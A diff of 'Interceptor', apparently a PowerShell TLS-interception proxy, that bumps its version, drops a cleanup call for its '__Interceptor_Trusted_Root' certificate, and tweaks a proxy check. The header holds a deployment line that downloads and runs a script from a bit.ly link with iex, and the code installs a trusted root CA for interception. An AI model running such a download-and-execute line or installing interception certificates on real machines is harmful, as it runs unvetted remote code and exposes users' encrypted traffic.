@@ -11,8 +11,8 @@ Author: Casey Smith, Twitter: @subTee
 License: BSD 3-Clause
 Required Dependencies: None
 Optional Dependencies: None
-Version: 1.3.7
-Release Date: 09142014 1444 
+Version: 1.3.10
+Release Date: 09162014 0408 
 Deployment: iex (New-Object Net.WebClient).DownloadString(“http://bit.ly/1upejwC”)
 
 .DESCRIPTION
@@ -467,8 +467,7 @@ function Get-ClientHttpRequest([System.Net.Sockets.TcpClient] $client, [System.N
 
 function Main()
 {	
-	# Cleanup Old Certificates... Really belongs on script close...
-	Invoke-RemoveCertificates "CN=__Interceptor_Trusted_Root"	
+	
 	
 	# Create And Install Trusted Root CA.
 	$CAcertificate = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match "__Interceptor_Trusted_Root"  })
@@ -513,7 +512,7 @@ function Main()
 	
 	
 	
-	if($ProxyServer -ne $null)
+	if($ProxyServer)
 	{
 		$proxy = New-Object System.Net.WebProxy($ProxyServer, $ProxyPort)
 		[Console]::WriteLine("Using Proxy Server $ProxyServer : $ProxyPort")
@@ -525,16 +524,19 @@ function Main()
 		[Console]::WriteLine("Using Direct Internet Connection")
 	}
 		
+		
+	
 	while($true)
 	{
-		$client = $listener.AcceptTcpClient()
 		
+		$client = $listener.AcceptTcpClient()
 		if($client -ne $null)
 		{
 			Get-ClientHttpRequest $client $proxy
 		}
 		
 	}
+	
 
 }
 
